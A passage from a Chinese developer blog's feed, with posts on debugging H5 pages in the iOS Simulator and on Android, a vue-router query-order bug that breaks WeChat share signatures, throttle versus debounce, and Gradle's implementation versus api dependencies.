https://www.baidu.com</span><br></pre></td></tr></table></figure><p><code>xcrun</code> 会自动在 xcode developer 目录下查找<code>simctl</code>命令，而<code>simctl</code> 是操作<code>Simulator.app</code>的命令。</p><p>参数 <code>booted</code> 将操作目标指向当前启动的模拟器。</p><p>2.2 在 app 中打开</p><p>模拟器安装 app</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xcrun simctl install booted youriPhone.app</span><br></pre></td></tr></table></figure><p>在 app 上打开网页</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xcrun simctl openurl booted APP_SCHEME:URL</span><br></pre></td></tr></table></figure><p><code>APP_SCHEME</code> 及后面的路径根据自己 app 注册的去更改。</p><p>3.打开 mac 上的Safari</p><p><code>Menu -&gt; Develop -&gt; Simulator</code>，选择打开的网址即可调试了。</p><h2 id="android-真机调试">Android 真机调试</h2><ol><li>usb 链接 Android 设备到 mac</li><li>打开开发者选项模式，开启 usb debug</li><li>Chrome 浏览器打开 <code>chrome://inspect/#devices</code></li><li>如果该页面没有显示设备，全局翻墙或者重新拔插 usb 后刷新页面重试。</li></ol><p>有的 app 使用的是手Q X5 内核，在 app 中打开<code>http://debugx5.qq.com</code></p><ol><li><p>在 “X5调试页面” 上，点击进入 “信息” Tab。</p></li><li><p>找到TBS settings栏目，勾选&quot;是否打开TBS内核Inspector调试功能&quot;，然后点击确认，进程自动退出。</p></li><li><p>重新打开Web页面，使用Inspector页面调试功能。</p></li></ol><p>（有时候，为了确认是 X5内核引起的兼容性问题，还可以打开<code>http://debugtbs.qq.com</code>，选择使用系统自带内核。）</p><!-- more --><h2 id="利用-alfred-快捷打开-simulator">利用 Alfred 快捷打开 Simulator</h2><p>利用 xcode command 提供的命令，可以在 Alfred 中快速打开 Simulator 并导航到待调试页面。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> workflow <span class="keyword">import</span> Workflow3</span><br><span class="line"></span><br><span class="line">APP_NAME = <span class="string">'Mogujie4iPhone.10.4.0.app'</span></span><br><span class="line">APP_SCHEME = <span class="string">'mogujie://open?url='</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">luanch</span><span class="params">()</span>:</span></span><br><span class="line">    cmd = <span class="string">'open -a `xcode-select -p`/Applications/Simulator.app'</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_call(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install</span><span class="params">(json_str=<span class="string">''</span>)</span>:</span></span><br><span class="line">    option = json.loads(json_str)</span><br><span class="line">    <span class="comment"># no booted devices found</span></span><br><span class="line">    <span class="keyword">if</span> option[<span class="string">'identifier'</span>] == <span class="string">''</span>:</span><br><span class="line">        luanch()</span><br><span class="line">        cmd = <span class="string">'xcrun simctl install booted ~/.ios-simulator/'</span> + APP_NAME</span><br><span class="line">        <span class="keyword">return</span> subprocess.check_call(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd = <span class="string">'xcrun simctl install &#123;identifier&#125; ~/.ios-simulator/'</span> + APP_NAME</span><br><span class="line">        cmd = cmd.format(identifier=option[<span class="string">'identifier'</span>])</span><br><span class="line">        <span class="keyword">return</span> subprocess.check_call(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(json_str=<span class="string">''</span>)</span>:</span></span><br><span class="line">    option = json.loads(json_str)</span><br><span class="line"></span><br><span class="line">    url = APP_SCHEME + urllib.pathname2url(option[<span class="string">'url'</span>])</span><br><span class="line">    cmd = <span class="string">'xcrun simctl openurl &#123;identifier&#125; &#123;url&#125;'</span></span><br><span class="line">    cmd = cmd.format(identifier=option[<span class="string">'identifier'</span>], url=url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_call(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_booted</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># get booted list</span></span><br><span class="line">    cmd = <span class="string">'xcrun simctl list | grep Booted'</span></span><br><span class="line">    <span class="comment"># iPhone X (3D62292C-C2C4-4DE5-B2E0-EDA1AC846115) (Booted)</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>).splitlines()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(wf)</span>:</span></span><br><span class="line">    args = wf.args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        booted_list = get_booted()</span><br><span class="line">        items = []</span><br><span class="line">        <span class="keyword">for</span> booted <span class="keyword">in</span> booted_list:</span><br><span class="line">            match = re.search(<span class="string">r'\((.*?)\)'</span>, booted)</span><br><span class="line">            <span class="keyword">if</span> match:</span><br><span class="line">                identifier = match.group(<span class="number">1</span>)</span><br><span class="line">                items.append(&#123;</span><br><span class="line">                    <span class="string">'title'</span>: booted.strip(),</span><br><span class="line">                    <span class="string">'subtitle'</span>: identifier,</span><br><span class="line">                    <span class="string">'identifier'</span>: identifier,</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">            <span class="keyword">if</span> len(args) &gt; <span class="number">0</span>:</span><br><span class="line">                url = args[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">''</span></span><br><span class="line">            <span class="comment"># pass the url args down use json str</span></span><br><span class="line">            arg = json.dumps(&#123;<span class="string">'url'</span>: url, <span class="string">'identifier'</span>: item[<span class="string">'identifier'</span>]&#125;)</span><br><span class="line">            wf.add_item(title=item[<span class="string">'title'</span>],</span><br><span class="line">                        subtitle=item[<span class="string">'subtitle'</span>],</span><br><span class="line">                        arg=arg,</span><br><span class="line">                        valid=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">        luanch()</span><br><span class="line"></span><br><span class="line">    wf.send_feedback()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    wf = Workflow3()</span><br><span class="line">    sys.exit(wf.run(main))</span><br></pre></td></tr></table></figure><p>注意更改代码中的 <code>APP_NAME</code> 和 <code>APP_SCHEME</code></p><p>可以使用下面快捷命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动模拟器</span></span><br><span class="line">is luanch </span><br><span class="line"><span class="comment"># 在模拟器中安装 ~/.iso-simulator 目录下的 app</span></span><br><span class="line">is install </span><br><span class="line"><span class="comment"># 在模拟器中打开h5地址</span></span><br><span class="line">is open http://xxxx.com</span><br></pre></td></tr></table></figure><p>最终效果如图</p><p><img src="/media/15226270595220.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文记录了如何在 iOS Simulator 和 Android 设备上调试 h5 页面，并在提供了 Alfred 脚本来便捷地管理 Simulator。&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>vue router 与微信分享失败</title>
    <link href="https://deskid.github.io/2018/02/02/2018-02-02-1/"/>
    <id>https://deskid.github.io/2018/02/02/2018-02-02-1/</id>
    <published>2018-02-02T15:48:18.000Z</published>
    <updated>2018-11-14T03:08:30.992Z</updated>
    
    <content type="html"><![CDATA[<p>最近在接入微信分享时发现一个奇怪的现象：</p><p>首次分享没问题，二次分享总是失败。</p><a id="more"></a><p>具体操作如下：</p><ol><li><p>直接在微信扫码打开页面</p></li><li><p>分享 （分享正常，title、content都带上了）<br><img src="/media/15175660133155.jpg" alt></p></li><li><p>点击分享链接打开页面</p></li><li><p>二次分享 （分享失败）<br><img src="/media/15175660448420.jpg" alt></p></li></ol><p>首先查看官方文档，显然是JS-SDK鉴权失败导致的。</p><p>在微信中分享时需要先去获取JS-SDK权限验证的签名。这个签名请求的参数中就需要带上当前页面的url。</p><blockquote><p>签名生成规则如下：</p><p>参与签名的字段包括<strong>noncestr</strong>（随机字符串）, 有效的<strong>jsapi_ticket</strong>, <strong>timestamp</strong>（时间戳）, <strong>url</strong>（当前网页的URL，不包含#及其后面部分）。</p><p>对所有待签名参数按照字段名的ASCII 码从小到大排序（字典序）后，使用URL键值对的格式拼接成字符串string1。这里需要注意的是所有参数名均为小写字符。对string1作sha1加密，字段名和字段值都采用原始值，不进行URL 转义。</p></blockquote><p>而二次分享和首次分享的区别在于——<br>分享出去的页面后面加上了类似<code>from=singlemessage</code> 、 <code>isappinstalled=1</code>的参数，在二分分享时验证JS-SDK使用的是加上了微信参数后的地址。</p><p>例如，我们最终分享出去的页面地址就加上了微信参数：</p><p><a href="http://h5.mogujie.com/pay/tthongbao_index.html?_fu=135hgdc&amp;_mgjuuid=24b0c55e-04c7-4237-8184-8024cfc468ea&amp;f=1002&amp;ptp=m1.TTiXHb.0.0.eMNdRLs&amp;shareUid=135hgdc&amp;from=groupmessage&amp;isappinstalled=1" target="_blank" rel="noopener">http://h5.mogujie.com/pay/tthongbao_index.html?_fu=135hgdc&amp;_mgjuuid=24b0c55e-04c7-4237-8184-8024cfc468ea&amp;f=1002&amp;ptp=m1.TTiXHb.0.0.eMNdRLs&amp;shareUid=135hgdc&amp;from=groupmessage&amp;isappinstalled=1</a></p><p>但是这不是问题的直接原因，因为我们在每次打开页面时都会动态地用当前页面的url去请求签名，这个url已经带上了微信参数。</p><p>那么验证失败只可能有一个原因——我们的url在获得签名后发生了改变。</p><p>在微信中打开页面后打印当前页面url验证一下：</p><p><a href="http://h5.mogujie.com/pay/tthongbao_index.html?_fu=135hgdc&amp;_mgjuuid=24b0c55e-04c7-4237-8184-8024cfc468ea&amp;f=1002&amp;from=groupmessage&amp;isappinstalled=1&amp;ptp=m1.TTiXHb.0.0.eMNdRLs&amp;shareUid=135hgdc" target="_blank" rel="noopener">http://h5.mogujie.com/pay/tthongbao_index.html?_fu=135hgdc&amp;_mgjuuid=24b0c55e-04c7-4237-8184-8024cfc468ea&amp;f=1002&amp;from=groupmessage&amp;isappinstalled=1&amp;ptp=m1.TTiXHb.0.0.eMNdRLs&amp;shareUid=135hgdc</a></p><p>发现页面地址真的变了。这里注意到 <code>query string</code> 按照 key 的字母顺序重排了。这个重排动作并不是浏览器做的，因为当我访问别的活动页地址时，并不会有这样的重排。</p><p>观察到重排现象后，我开始怀疑vue-router了。果然在issue列表中找到了<a href="https://github.com/vuejs/vue-router/issues/926" target="_blank" rel="noopener">issues-926</a>(看到掉进坑里的不止我一个，莫名其妙的开心了起来)。</p><p>按照 vue-router 的 release log ，在 <a href="https://github.com/vuejs/vue-router/releases/tag/v2.1.0" target="_blank" rel="noopener">2.1.0</a> 版本的<code>stringifyQuery</code>函数中已经去掉了sort动作。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">export function stringifyQuery (obj: Dictionary&lt;string&gt;): string &#123;</span><br><span class="line"><span class="deletion">-  const res = obj ? Object.keys(obj).sort().map(key =&gt; &#123;</span></span><br><span class="line"><span class="addition">+  const res = obj ? Object.keys(obj).map(key =&gt; &#123;</span></span><br><span class="line">      const val = obj[key]</span><br><span class="line">    </span><br><span class="line">      if (val <span class="comment">=== undefined) &#123;</span></span><br></pre></td></tr></table></figure><p>升级到最新版本后再次测试果然二次分享ok了。</p><hr><p>然而这里的坑并没有结束，只是被隐藏的更深了。</p><p><code>vue-router</code> 在 <code>parseQuery</code> 时将 query 字符串构造为一个字典对象；然后在 history.pushState 时再将这个字典对象<code>stringifyQuery</code>转化为一个 queryString 字符串。</p><p>在序列化和反序列化的过程中，最重要的是保持前后的信息一致。</p><p><code>vue-router</code> 2.1.0 之前的版本由于对<code>Object.keys(obj)</code>进行<code>sort</code>导致了顺序信息的丢失，引起序列化前后地址不一致。<br>那么去掉了<code>sort</code>操作后的<code>vue-router</code>能还原顺序信息了吗？</p><p>99%的情况下可以，除非 query 中带有 Array 类型的 value…</p><p>举例说明：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?foo=bar&amp;baz=qux&amp;foo=bla</span><br></pre></td></tr></table></figure><p>经过<code>vue-router</code> 的<code>parseQuery</code>后，变成了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  foo: [bar,bla],</span><br><span class="line">  baz: qux</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里转化没问题，再通过 <code>stringifyQuery</code> 转为字符串呢，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?foo=bar&amp;foo=bla&amp;baz=qux</span><br></pre></td></tr></table></figure><p>地址又变了！</p><p>拿<a href="https://url.spec.whatwg.org/#urlsearchparams" target="_blank" rel="noopener">标准实现</a> <code>URLSearchParams</code> 测试一下就会发现：在<code>URLSearchParams</code>上调用<code>toString</code>不会改变原来的queryString顺序：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var paramsString = &quot;foo=bar&amp;baz=qux&amp;foo=bala&quot;;</span><br><span class="line">var searchParams = new URLSearchParams(paramsString);</span><br><span class="line"></span><br><span class="line">for (let p of searchParams) &#123;</span><br><span class="line">  console.log(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">searchParams.toString();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(2) [&quot;foo&quot;, &quot;bar&quot;]</span><br><span class="line">(2) [&quot;baz&quot;, &quot;qux&quot;]</span><br><span class="line">(2) [&quot;foo&quot;, &quot;bala&quot;]</span><br><span class="line">&quot;foo=bar&amp;baz=qux&amp;foo=bala&quot;</span><br></pre></td></tr></table></figure><p>而在vue-router内部，<code>parseQuery</code>在遇到重复的<code>key</code>时，会把字典中原有的value转化为数组，再将新的 value push到数组尾部。这里不可避免的丢失了<code>key</code>数组原来出现在url中的顺序。</p><p>归根结底，还是数据结构选取的锅：<code>parseQuery</code>生成的对象应该是一个 key-value 组成的<code>pair list</code>而不是<code>dictionary</code>。</p><p>找到思路了，vue-router源码也是现成的，那就改吧。</p><p>由于 query 对象是通过<code>$router</code>对外暴露的，直接改<code>parseQuery</code>的返回值类型代价太大了。我的思路是给 query 对象增加一个属性。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">function parseQuery (query: string): Dictionary&lt;string&gt; &#123;</span><br><span class="line">  const res = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="addition">+  Object.defineProperty(res, '_rawQuery', &#123;</span></span><br><span class="line"><span class="addition">+    value: [],</span></span><br><span class="line"><span class="addition">+    enumerable: false</span></span><br><span class="line"><span class="addition">+  &#125;)</span></span><br><span class="line"></span><br><span class="line">  query = query.trim().replace(/^(\?|#|&amp;)/, '')</span><br><span class="line"></span><br><span class="line">  if (!query) &#123;</span><br><span class="line">    return res</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-  query.split('&amp;').forEach((param) =&gt; &#123;</span></span><br><span class="line"><span class="addition">+  query.split('&amp;').forEach((param, index) =&gt; &#123;</span></span><br><span class="line">    const parts = param.replace(/\+/g, ' ').split('=')</span><br><span class="line">    const key = decode(parts.shift())</span><br><span class="line">    const val = parts.length &gt; 0</span><br><span class="line">      ? decode(parts.join('='))</span><br><span class="line">      : null</span><br><span class="line"></span><br><span class="line"><span class="addition">+    if (res._rawQuery[index] === undefined) &#123;</span></span><br><span class="line"><span class="addition">+      res._rawQuery[index] = []</span></span><br><span class="line"><span class="addition">+      res._rawQuery[index][0] = key</span></span><br><span class="line"><span class="addition">+      res._rawQuery[index][1] = val</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (res[key] <span class="comment">=== undefined) &#123;</span></span><br><span class="line">      res[key] = val</span><br><span class="line">    &#125; else if (Array.isArray(res[key])) &#123;</span><br><span class="line">      res[key].push(val)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      res[key] = [res[key], val]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  return res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>parseQuery()</code>函数中额外添加<code>_rawQuery</code>数组属性，为了简单，这里使用了二维数组来模拟pair。按照<code>queryString</code> key-value 出现的顺序初始化数组。注意：为了不影响原来对Component暴露的query对象，特地将<code>_rawQuery</code>的<code>enumerable</code>置为false。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">export function stringifyQuery (obj: Dictionary&lt;string&gt;): string &#123;</span><br><span class="line"><span class="addition">+  const hasRawQuery = !!obj._rawQuery</span></span><br><span class="line"><span class="addition">+  const queryObj = hasRawQuery ? obj._rawQuery : obj</span></span><br><span class="line"><span class="deletion">-  const res = obj ? Object.keys(obj).map(key =&gt; &#123;</span></span><br><span class="line"><span class="addition">+  const res = queryObj ? Object.keys(queryObj).map(index =&gt; &#123;</span></span><br><span class="line"><span class="addition">+   const key = hasRawQuery ? queryObj[index][0] : index</span></span><br><span class="line"><span class="deletion">-   const val = obj[key]</span></span><br><span class="line"><span class="addition">+   const val = hasRawQuery ? queryObj[index][1] : obj[index]</span></span><br><span class="line"></span><br><span class="line">    if (val <span class="comment">=== undefined) &#123;</span></span><br><span class="line">      return ''</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (val <span class="comment">=== null) &#123;</span></span><br><span class="line">      return encode(key)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (Array.isArray(val)) &#123;</span><br><span class="line">      const result = []</span><br><span class="line">      val.forEach(val2 =&gt; &#123;</span><br><span class="line">        if (val2 <span class="comment">=== undefined) &#123;</span></span><br><span class="line">          return</span><br><span class="line">        &#125;</span><br><span class="line">        if (val2 <span class="comment">=== null) &#123;</span></span><br><span class="line">          result.push(encode(key))</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          result.push(encode(key) + '=' + encode(val2))</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      return result.join('&amp;')</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return encode(key) + '=' + encode(val)</span><br><span class="line">  &#125;).filter(x =&gt; x.length &gt; 0).join('&amp;') : null</span><br><span class="line">  return res ? `?$&#123;res&#125;` : ''</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>stringifyQuery()</code>函数中先判断是否有<code>_rawQuery</code>，有的话优先用<code>_rawQuery</code>。其余操作一致。</p><p>改完后，跑一遍vue-router单元测试。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm run test:unit</span><br><span class="line"></span><br><span class="line">Started</span><br><span class="line">................................................................</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">64 specs, 0 failures</span><br><span class="line">Finished in 0.3 seconds</span><br></pre></td></tr></table></figure><p>测试通过，浏览器中的<code>?foo=bar&amp;baz=qux&amp;foo=bla</code>顺序也保留下来了，完美。</p><p>总结：</p><ol><li>query string 本身只是键值对，是顺序无关的，w3c规范也没有强调说一定要符合特定的顺序。vue-router 2.1.0之前的版本的<code>sort</code>操作纯属画蛇添足。最好的做法是保留原有的顺序信息，把问题抛到framework外部去解决。</li><li>微信js-sdk的签名接口设计的不合理：只考虑了key排序的问题，而忽视了作为value的url的排序问题。由于url query参数的顺序不影响url的相等性，在计算签名时应该在接口内部对url的query进行排序操作。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在接入微信分享时发现一个奇怪的现象：&lt;/p&gt;
&lt;p&gt;首次分享没问题，二次分享总是失败。&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
      <category term="vue" scheme="https://deskid.github.io/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>throttle 和 debounce</title>
    <link href="https://deskid.github.io/2017/12/08/throttle-vs-debounce/"/>
    <id>https://deskid.github.io/2017/12/08/throttle-vs-debounce/</id>
    <published>2017-12-07T16:18:28.000Z</published>
    <updated>2018-11-14T03:16:05.704Z</updated>
    
    <content type="html"><![CDATA[<p>throttle 和 debounce 是两个控制方法调用频率的高阶函数。</p><p>本文比较了这两个函数的区别和使用场景。</p><a id="more"></a><h3 id="throttle">throttle:</h3><p>使得某个函数在每间隔一段时间内执行不大于一次。</p><p>用通俗的例子来描述：某个函数去乘地铁。地铁每隔一段固定时间发车。不管乘客怎么源源不断地来，都得等一段时间，在地铁进站后才能上车；</p><p>下图示中  <code>X</code>是一个被 throttled 的函数实际执行的时机</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">||||||||||||||||||||||||| (pause) |||||||||||||||||||||||||</span><br><span class="line">X    X    X    X    X    X        X    X    X    X    X    X</span><br></pre></td></tr></table></figure><h4 id="throttle的使用场景：">throttle的使用场景：</h4><ul><li>resize 事件</li><li>mouse move 事件</li><li>scroll 事件</li></ul><blockquote><p>当基于性能、效率上的考虑，要限制函数的执行频率时可以使用 throttle</p></blockquote><h4 id="实现">实现</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">throttle = <span class="function"><span class="keyword">function</span>(<span class="params">fn, threshold=<span class="number">250</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> last</span><br><span class="line">  <span class="keyword">var</span> timer</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span></span><br><span class="line">    <span class="keyword">var</span> now = +<span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (last &amp;&amp; now &lt; last + threshold) &#123;</span><br><span class="line">      clearTimeout(timer)</span><br><span class="line">      timer = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        last = now</span><br><span class="line">        fn.apply(context, args)</span><br><span class="line">      &#125;, threshold)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 第一次执行、或者超过时间阈值</span></span><br><span class="line">      last = now</span><br><span class="line">      fn.apply(context, args)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="debounce">debounce:</h3><p>使得某个函数在一段时间阈值内执行且只执行一次。</p><p>这个也可以举个例子来描述：某个函数乘坐电梯去上班，快关电梯门的时候发现了同事也来了，于是按住开关放同事进来。假设此时是上班高峰，同事络绎不绝的来乘电梯，而电梯足够大。那么在这一段时间内，电梯都不会启动，直到电梯门关上。</p><p>下图示中 <code>X</code>是一个被 debounce 的函数实际执行的时机</p><pre><code>|||||||||||||||||||||||| (pause) ||||||||||||||||||||||||                        X                                 X</code></pre><h4 id="常见的使用场景：">常见的使用场景：</h4><ul><li>toggling state</li><li>until scroll end 事件</li><li>until mouse move end 事件</li><li>until typing end 事件</li><li>触发 Ajax 请求的 event</li></ul><blockquote><p>基于幂等的考虑，需要将一段时间内的所有事件收束为一个事件，可以使用 debounce</p></blockquote><h4 id="实现-v2">实现</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">debounce = <span class="function"><span class="keyword">function</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timeout;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>, args = <span class="built_in">arguments</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> later = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">        func.apply(context, args);</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    clearTimeout(timeout);</span><br><span class="line">    timeout = setTimeout(later, wait);</span><br><span class="line">    </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="参考">参考</h3><p><a href="http://demo.nimius.net/debounce_throttle/" target="_blank" rel="noopener">可视化demo</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;throttle 和 debounce 是两个控制方法调用频率的高阶函数。&lt;/p&gt;
&lt;p&gt;本文比较了这两个函数的区别和使用场景。&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>gradle 新依赖函数 implementation api详解</title>
    <link href="https://deskid.github.io/2017/12/04/gradle-compile/"/>
    <id>https://deskid.github.io/2017/12/04/gradle-compile/</id>
    <published>2017-12-04T14:33:24.000Z</published>
    <updated>2018-11-14T03:16:16.007Z</updated>
    
    <content type="html"><![CDATA[<p>在 gradle 3.0 之后 compile、provided、apk 被 deprecated，取而代之的是 implementation 、api、compileOnly、runtimeOnly。</p><p>本文重点是介绍implementation和api。</p><a id="more"></a><h3 id="api">api</h3><p>api 修饰的依赖会被暴露并传递给外部，也就是说：在外部module引用该lib时，module会把该lib的api依赖传递依赖过来，并添加到module自己的compile classpath上。（在运行期和编译期api依赖都可见。）如果有一个api dependency修改了对外API，那么所有依赖和间接依赖了该 dependency 的module都会被重新编译。</p><h3 id="implementation">implementation</h3><p>implementation 则相反，implementation修饰的依赖不会被暴露给外部module，在引用该lib时，lib内通过implementation申明的依赖不会被添加到module 的 compile classpath上。（也就是说lib的依赖仅在runtime可见，编译期不可见。）如果有一个implementation dependency 修改了API，那么仅该dependency 和 直接依赖于它的module会被重新编译。</p><h3 id="compile">compile</h3><p>compile 的行为和api一致，已经被标记为deprecated。</p><p>为什么要提供两种依赖函数呢？</p><ul><li><p>可以更好的控制 transitive dependency</p></li><li><p>compile classpath更精简，编译速度得到提升</p></li><li><p>implementation dependencies 发生改变不会导致全量地重新编译</p></li><li><p>在POM中依赖关系更加清晰：编译library的依赖和运行library的依赖区可以分开了。</p></li></ul><!-- more --><p>举例说明：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">└── App</span><br><span class="line">    ├── implementation A</span><br><span class="line">    │   └── implementation a1</span><br><span class="line">    │   └── api a2</span><br><span class="line">    └── implementation B</span><br><span class="line">       └── implementation b1</span><br><span class="line">       └── api b2</span><br></pre></td></tr></table></figure><p>A lib分别通过implementation 和 api 依赖了a1、a2；<br>B lib分别通过implementation 和 api 依赖了b1、b2；<br>App 通过implementation直接依赖了A、B lib；<br>App 被A传递依赖了a2；<br>App 被B传递依赖了b2；</p><ol><li>编译App时，compile classpath中的依赖有 A、B、a2、b2</li><li>a1 对外暴露的API有修改 —— 仅 a1 和 A 会被重新编译，b1 同理。</li><li>a2 对外暴露的API有修改 —— a2 、 A 、App 都会被重新编译，b2 同理。</li></ol><h3 id="如何判断自己library的依赖属于哪种类型呢？">如何判断自己library的依赖属于哪种类型呢？</h3><p>api 依赖一般是指那些暴露在library binary interface(也叫Application Binary Interface)中的，包括但不仅仅限于下面case：</p><ul><li><p>在interface和父类中被引用到的</p></li><li><p>在<code>public</code>方法参数中引用到的,包括泛型参数</p></li><li><p>在<code>public</code>属性中引用到的</p></li><li><p>在<code>public</code> annotation 中引用到的。</p></li></ul><blockquote><p><em>注这里 <code>public</code> 是广义上的，泛指对编译器可见，比如：<code>public</code>, <code>protected</code> 以及 <code>package private</code>概念都是<code>public</code>的)</em></p></blockquote><p>相反，下面case和ABI不相关的，则应该被申明为<code>implementation</code> dependency:</p><ul><li><p>仅仅被方法内部引用的</p></li><li><p>仅仅被 private 成员引用的</p></li><li><p>仅仅被内部类引用的(未来，Gradle 会允许用户申明那些包属于公共API)</p></li></ul><p>官方提供了一个<a href="https://docs.gradle.org/current/userguide/java_library_plugin.html#sec:java_library_recognizing_dependencies" target="_blank" rel="noopener">例子</a>，如何根据上述规则推导不同依赖类型。</p><p>实际上使用时，可以偷懒地判断，大部分情况下：</p><ol><li>在app和test module中应该使用implementation引入dependency</li><li>在library module中应该使用api引入dependency，除了非public引用的dependency。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 gradle 3.0 之后 compile、provided、apk 被 deprecated，取而代之的是 implementation 、api、compileOnly、runtimeOnly。&lt;/p&gt;
&lt;p&gt;本文重点是介绍implementation和api。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="gradle" scheme="https://deskid.github.io/tags/gradle/"/>
    
  </entry>
  
  <entry>
    <title>module in JavaScript</title>
    <link href="https://deskid.github.io/2017/11/28/module-in-js/"/>
